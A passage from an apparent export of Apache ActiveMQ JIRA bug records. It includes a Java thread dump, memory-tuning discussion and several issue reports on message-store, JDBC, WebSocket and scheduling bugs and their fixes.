        at sun.rmi.transport.tcp.TCPTransport.run(TCPTransport.java:340)
        at java.lang.Thread.run(Thread.java:595)

""RMI TCP Accept-0"" daemon prio=1 tid=0x0866f760 nid=0x2d0c runnable [0x8be34000..0x8be34e80]
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
        - locked <0x90c192a8> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(ServerSocket.java:450)
        at java.net.ServerSocket.accept(ServerSocket.java:421)
        at sun.management.jmxremote.LocalRMIServerSocketFactory$1.accept(LocalRMIServerSocketFactory.java:31)
        at sun.rmi.transport.tcp.TCPTransport.run(TCPTransport.java:340)
        at java.lang.Thread.run(Thread.java:595)

""Timer-0"" daemon prio=1 tid=0x0866d9b0 nid=0x2d0b in Object.wait() [0x8beb5000..0x8beb5f00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90c19368> (a java.util.TaskQueue)
        at java.lang.Object.wait(Object.java:474)
        at java.util.TimerThread.mainLoop(Timer.java:483)
        - locked <0x90c19368> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Timer.java:462)

""Low Memory Detector"" daemon prio=1 tid=0x08609be0 nid=0x2d0a runnable [0x00000000..0x00000000]

""CompilerThread1"" daemon prio=1 tid=0x08608800 nid=0x2d09 waiting on condition [0x00000000..0x8c07d228]

""CompilerThread0"" daemon prio=1 tid=0x08607880 nid=0x2d08 waiting on condition [0x00000000..0x8c0fe2a8]

""AdapterThread"" daemon prio=1 tid=0x086068d0 nid=0x2d07 waiting on condition [0x00000000..0x00000000]

""Signal Dispatcher"" daemon prio=1 tid=0x08605990 nid=0x2d06 waiting on condition [0x00000000..0x00000000]

""Finalizer"" daemon prio=1 tid=0x085fb210 nid=0x2d05 in Object.wait() [0x8c5f3000..0x8c5f3e00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90bd9468> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:120)
        - locked <0x90bd9468> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:136)
        at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:159)

""Reference Handler"" daemon prio=1 tid=0x085fab78 nid=0x2d04 in Object.wait() [0x8c674000..0x8c674e80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90bd5ba0> (a java.lang.ref.Reference$Lock)
        at java.lang.Object.wait(Object.java:474)
        at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:116)
        - locked <0x90bd5ba0> (a java.lang.ref.Reference$Lock)

""main"" prio=1 tid=0x0851b0c0 nid=0x2cf8 waiting on condition [0xbfb20000..0xbfb222a8]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:716)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:746)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1076)
        at java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync.wlock(ReentrantReadWriteLock.java:342)
        at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:637)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:886)
        at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:833)
        at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:825)
        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:751)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeMessage(KahaDBStore.java:378)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeAsyncMessage(KahaDBStore.java:350)
        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.removeAsyncMessage(KahaDBTransactionStore.java:457)
        at org.apache.activemq.store.kahadb.KahaDBTransactionStore$1.removeAsyncMessage(KahaDBTransactionStore.java:171)
        at org.apache.activemq.broker.region.Queue.acknowledge(Queue.java:797)
        at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1527)
        at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1519)
        at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1584)
        at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1574)
        at org.apache.activemq.broker.region.Queue$5.recoverMessage(Queue.java:283)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:472)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:464)
        at org.apache.activemq.store.ProxyMessageStore.recover(ProxyMessageStore.java:52)
        at org.apache.activemq.broker.region.Queue.initialize(Queue.java:269)
        at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:86)
        at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:473)
        at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56)
        at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:123)
        - locked <0x91155e68> (a java.lang.Object)
        at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:298)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:157)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
        at org.apache.activemq.security.AuthorizationBroker.addDestination(AuthorizationBroker.java:81)
        at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
        at org.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:95)
        at org.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:198)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.start(ManagedRegionBroker.java:106)
        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
        at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:109)
        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
        at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1781)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:489)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:60)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:592)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        - locked <0x90bd3550> (a java.util.concurrent.ConcurrentHashMap)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
        - locked <0x90bd3858> (a java.util.concurrent.ConcurrentHashMap)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
        - locked <0x90bd7120> (a java.lang.Object)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:117)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:115)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:592)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)

""VM Thread"" prio=1 tid=0x085f86f0 nid=0x2d03 runnable 

""GC task thread#0 (ParallelGC)"" prio=1 tid=0x08535ad0 nid=0x2cff runnable 

""GC task thread#1 (ParallelGC)"" prio=1 tid=0x08536720 nid=0x2d00 runnable 

""GC task thread#2 (ParallelGC)"" prio=1 tid=0x08537358 nid=0x2d01 runnable 

""GC task thread#3 (ParallelGC)"" prio=1 tid=0x08537f90 nid=0x2d02 runnable 

""VM Periodic Task Thread"" prio=1 tid=0x0852cfe8 nid=0x2d0d waiting on condition 
;;;","26/Apr/11 21:37;scotte;With some additional testing we were also able to hit AMQ-3120.

We decided to give ActiveMQ 5.5.0 a try, but with the exact same config we were using in 5.4.2 we hit an OutOfMemory within a few minutes. Max heap is 512M, mem store is 256M.

Exception in thread ""ConcurrentQueueStoreAndDispatch"" java.lang.OutOfMemoryError: Java heap space
        at org.apache.activemq.util.DataByteArrayOutputStream.ensureEnoughBuffer(DataByteArrayOutputStream.java:249)
        at org.apache.activemq.util.DataByteArrayOutputStream.writeBoolean(DataByteArrayOutputStream.java:140)
        at org.apache.activemq.openwire.v6.BaseDataStreamMarshaller.looseMarshalByteSequence(BaseDataStreamMarshaller.java:628)
        at org.apache.activemq.openwire.v6.MessageMarshaller.looseMarshal(MessageMarshaller.java:296)
        at org.apache.activemq.openwire.v6.ActiveMQMessageMarshaller.looseMarshal(ActiveMQMessageMarshaller.java:111)
        at org.apache.activemq.openwire.v6.ActiveMQTextMessageMarshaller.looseMarshal(ActiveMQTextMessageMarshaller.java:111)
        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:166)
;;;","26/Apr/11 21:47;scotte;Attached jms.java - producer testcase. Typically running 5 of these in a loop in parallel. This derived from some JMS sample code found somewhere out on the 'net.;;;","26/Apr/11 21:49;scotte;Attached configuration - activemq.xml;;;","27/Apr/11 10:19;gtully;Hi Scott, lots of info and different scenarios.

Lets first concentrate on 5.5. You need to configure a destination memory limit to limit the cache for the default store cursor.

<policyEntry queue="">"" memoryLimit=""256mb"" >

That will avoid the OOM for persistent messages.;;;","27/Apr/11 20:31;scotte;Thanks, that was a piece we were missing, but it doesn't seem to help - within a few minutes, I was able to hit OOM with a 512MB heap in just a couple of minutes with my test program. Increasing the ActiveMQ heap to 1024MB seems to be OK, but that's not the point - I would expect this case to be stable with a 512MB heap and 256MB limits for memstore and per-destination policy for "">"".

Stack trace:

Exception in thread ""ActiveMQ Broker[cluster_a] Scheduler"" java.lang.OutOfMemoryError: Java heap space
        at org.apache.activemq.protobuf.BaseMessage.mergeFramed(BaseMessage.java:228)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:825)
        at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:955)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:493)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)

Sorry for the disparate scenarios - we are trying to find one configuration that will result in a reliable and stable configuration...;;;","29/Nov/11 10:40;choufeng.tw;Hey Scott! I am facing the same problem, but the difference is that I just send an byte message (around 100MB), and the ""OutOfMemoryError"" be thrown, the following situation is just like you said. I was thinking is that really a bug? or we have to tune the configuration for AMQ. Because if we really want to send large messages, blob or stream message can be used. Did you try to send blob message?;;;","30/Nov/11 03:56;scotte;Sorry, I don't really know Timothy. At my last job we switched back from ActiveMQ to our previous JMS provider due to issues, and at my current job we'll likely switch to something else soon, as ActiveMQ doesn't do well under high load in large systems. Good luck!;;;","30/Nov/11 16:58;gtully;On the OOM, I gave your test case a whirl with trunk, the broker does go steady state at about 200MB but the problem is that it peaks to more than 600MB until GC kicks in.
The vm stack should be 3*the memory usage limit if we are expecting to max it out in normal operation. More aggressive GC would reduce that.
The broker does need resources because it pulls messages from a network, keeps them in memory and stores them to disk. There are a bunch of memory allocations that are gc candidates overtime, but there can be large peaks short term as both the marshalled and unmarshalled state are present in memory at some stages.

The store cursor is best in general. The vmcursor will try and reply messages from the store on restart so if an OOM was the cause of a stop, it will again occur on a restart.
The default store cursor will keep messages in memory up to its configured limit. 


That hang on start is resolved on trunk, recovery now takes out a write lock from the start. see: https://issues.apache.org/jira/browse/AMQ-3357

Scott: were there other load related issues that you encountered?
If you can find them with a 5.6-SNAPSHOT, they will be a priority.
;;;","30/Nov/11 17:01;gtully;The test case works on trunk as expected, but yes, the broker does need decent heap resources to deal with spikes.
In the order of 3*the system usage to be safe for this use case with expiry processing etc.

Additional hang issue resolved with:
https://issues.apache.org/jira/browse/AMQ-3357;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDb Transaction iterator remove doesn't throw Runtime Exception,AMQ-3292,12504985,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,yaytul,yaytul,22/Apr/11 14:42,20/Sep/11 10:42,14/Jul/23 05:43,30/Jul/11 21:41,5.5.0,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Apr/11 14:42;yaytul;patchfile.txt;https://issues.apache.org/jira/secure/attachment/12477113/patchfile.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14561,,,Sat Jul 30 21:41:39 UTC 2011,,,,,,,Patch Available,,,,"0|i0ajhj:",59430,,,,,,,,,,,,,,,,,,,,,"22/Apr/11 14:42;yaytul;Patch;;;","30/Jul/11 21:41;tabish;Patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ has problems storing >4K messages in Oracle,AMQ-3289,12504783,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,20/Apr/11 11:35,21/Sep/11 12:47,14/Jul/23 05:43,21/Sep/11 12:47,5.4.0,5.5.0,,,,5.6.0,,,Message Store,,,,0,BLOB,JDBC,oracle,,,,,,"The oracle persistence adapter extends the blob jdbc adapter but it has gotten out of sync with the method overrides. @Override to the rescue for the future.
The blob adapter uses native blob streaming to insert data (which can accommodate > 4k) but it has been out of step for some time.
The implementations need to be brought into line w.r.t to the api, schema and locking.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/11 17:03;william.mcdonald;BlobJDBCAdapter.java;https://issues.apache.org/jira/secure/attachment/12493341/BlobJDBCAdapter.java","07/Sep/11 17:03;william.mcdonald;OracleJDBCAdapter.java;https://issues.apache.org/jira/secure/attachment/12493342/OracleJDBCAdapter.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14591,,,Wed Sep 21 12:47:14 UTC 2011,,,,,,,,,,,"0|i0ajhr:",59431,,,,,,,,,,,,,,,,,,,,,"20/Apr/11 11:56;gtully;updated the blob adapter in revision: http://svn.apache.org/viewvc?rev=1095376&view=rev

Need someone with a handy Oracle install to validate the fix. Verify send received persistent messages > 4k

Kicked off a snapshot that will be done in an hour or so.;;;","20/Apr/11 12:13;gtully;It looks like the ojdbc6 drivers avoid this problem as they use the default adapter.;;;","07/Sep/11 17:03;william.mcdonald;Updates to make blob work with Oracle 10g.;;;","20/Sep/11 16:23;gtully;reopening to take in Williams patch;;;","21/Sep/11 12:47;gtully;patch applied with thanks in http://svn.apache.org/viewvc?rev=1173605&view=rev

@William, if you get a chance, can you validate tonight's 5.6-SNAPSHOT against Oracle.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"JDBC persistence adapter, intermittent performance degradation when a durable subscriber of priority messages falls behind",AMQ-3288,12504774,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,20/Apr/11 10:12,20/Sep/11 10:42,14/Jul/23 05:43,20/Apr/11 10:45,5.5.0,,,,,5.6.0,,,Message Store,,,,0,delay,durable,jdbc,priority,,,,,"Scenario: Messages are produced with rolling priority - jmsPriority = sendCount%10 so there are always high priority messages in the mix.
One durable client attempting to catch up when being behind by 100k messages.

Symptom: About the time the priority of messages being consumed switched from 9, to 8, the delay happened. Why it was happening, the log scrolled very fast with the percentage of memory use change debug command. Delivery was suspended.
This happened for about a minute or so. During this time, one cleanup timer tripped, there wasn't any delay for the cleanup sql.

It was strange, before the delay, the warning about memory stayed around 100% or so, but during the delay, it jumped up to 4000%.",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14636,,,Wed Apr 20 10:45:44 UTC 2011,,,,,,,,,,,"0|i0ajhz:",59432,,,,,,,,,,,,,,,,,,,,,"20/Apr/11 10:45;gtully;Fix in http://svn.apache.org/viewvc?view=revision&revision=1095352

Delay caused by store recovery ignoring batch size on a priority boundary, thus being limited only by memory resources.
Encountered some additional problems related to out-of-order delivery and missed messages with immediatePriorityDispatch on memory boundaries. In addition, some over eager cleanup when priority and non priority destinations are mixed. All of these are now fixed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WebSockets and truncated body,AMQ-3284,12504531,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,18/Apr/11 11:25,11/Feb/15 06:43,14/Jul/23 05:43,18/Apr/11 11:27,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"In WebSocket transport, StompSocket class calls StompFrame.toString() instead StompFrame.format(). Because of this, some frames can be truncated.",,gaikwaja,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5572,,,AMQ-3794,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14633,,,Mon Apr 18 11:27:28 UTC 2011,,,,,,,,,,,"0|i0aji7:",59433,,,,,,,,,,,,,,,,,,,,,"18/Apr/11 11:27;dejanb;Fixed with svn revision 1094495;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support for transactions broken in maven-activemq-perf-plugin,AMQ-3283,12504381,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,tmielke,tmielke,15/Apr/11 15:08,20/Sep/11 10:42,14/Jul/23 05:43,15/Apr/11 16:11,5.5.0,,,,,5.6.0,,,Performance Test,,,,0,performance,,,,,,,,"The doc of the [maven-activemq-perf-plugin|http://activemq.apache.org/activemq-performance-module-users-manual.html] lists these options:
producer.sessTransacted
consumer.sessTransacted

However they don't work. Nowhere in the code is a commit() for the transaction. 

","maven-activemq-perf-plugin with transaction support, Java 6, any OS",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Apr/11 15:17;tmielke;AMQ-3283.patch;https://issues.apache.org/jira/secure/attachment/12476458/AMQ-3283.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14632,,,Fri Apr 15 16:11:34 UTC 2011,,,,,,,Patch Available,,,,"0|i0ajif:",59434,,,,,,,,,,,,,,,,,,,,,"15/Apr/11 15:17;tmielke;I am attaching a possible fix for this bug. 
When setting producer.sessTransacted|consumer.sessionTransacted it will commit the transaction.

I further introduced a new configuration property called commitAfterXMsgs which tells after how many msgs to commit the transaction (as opposed to after every msg). This property defaults to 1 and is only used in conjunction with a transaction.

So two new properties that need to be documented:

producer.commitAfterXMsgs
consumer.commitAfterXMsgs

Once the patch is merged, I can update the plugin docs.
;;;","15/Apr/11 16:11;dejanb;Patch applied with svn revision 1092753;;;","15/Apr/11 16:11;dejanb;Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The wrapper.conf shipped in the linux-x86-32 and linux-x86-64 incorrectly specifies libwrapper.so,AMQ-3282,12504258,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,14/Apr/11 12:11,20/Sep/11 10:42,14/Jul/23 05:43,14/Apr/11 12:13,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"The wrapper.conf in the ./bin/linux-x86-32 and ./bin/linux-x86-64 directories incorrectly specifies libwrapper.so:

{code}# Java Library Path (location of Wrapper.DLL or libwrapper.so)
wrapper.java.library.path.1=%ACTIVEMQ_HOME%/bin/linux/{code}

There is no linux directory, just the ones for 32 and 64 bit versions specifically.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14627,,,Thu Apr 14 12:13:44 UTC 2011,,,,,,,,,,,"0|i0ajin:",59435,,,,,,,,,,,,,,,,,,,,,"14/Apr/11 12:13;dejanb;Fixed with svn revision 1092160;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB does not clean old files in combination with network connectors,AMQ-3279,12503947,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,aotto,aotto,11/Apr/11 15:53,28/Oct/11 09:33,14/Jul/23 05:43,28/Oct/11 09:33,5.4.1,,,,,5.6.0,,,Broker,,,,0,kahadb,,,,,,,,"we saw the well known problem with the KahaDB in our environment (kahadb does not clean old files).
Our Configuration is quite simple: 2 Activemq Broker with bidirectional network connectors.

Now because of other problems i started the brokers with deactivated network connectors - the behaviour of the kahadb does not change,
old files were left in the directory.

After restarting the brokers again with activated network connectors the kahadb works as aspected: old log files are deleted.
This behaviour is may or may not reproducable.


I do not understand this realy, so it would be helpful for me to know, if there exists a relation between kahadb bug and network connectors.","2 Broker Configuration with bidirectional network connectors
Linux server",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74705,,,Fri Oct 28 08:32:32 UTC 2011,,,,,,,,,,,"0|i0ajj3:",59437,,,,,,,,,,,,,,,,,,,,,"27/Oct/11 22:23;gtully;Could you verify if there is still an issue with a 5.6 snapshot. My suspicion is that it will be resolved.;;;","28/Oct/11 08:32;aotto;thanks a lot for your hint. I will see it when i have my next amq project.

mit freundlichen Grüßen
Albrecht Otto
--
Tel:   +49 (0) 30 332 66 93
Fax:   +49 (0) 30 367 287 64
Mobil: +49 (0) 160 946 541 01



Friday, October 28, 2011, 12:24:32 AM, you wrote:








;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CRON scheduling does not work correctly,AMQ-3278,12503799,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,matt_good@yahoo.com,matt_good@yahoo.com,08/Apr/11 22:36,18/Apr/11 22:57,14/Jul/23 05:43,18/Apr/11 22:57,5.5.0,,,,,,,,Broker,,,,0,,,,,,,,,"I have a listener with an event handler listening for messages and logging when they come in.
I sent a message to that queue with CRON string of ""25 * * * *"".  All other scheduler properties are not set.  No ttl.
The first time 25 after the hour comes around, a message is sent and my listener receives it.
All subsequent times 25 after the hour come around, the listener doesn't receive anything.
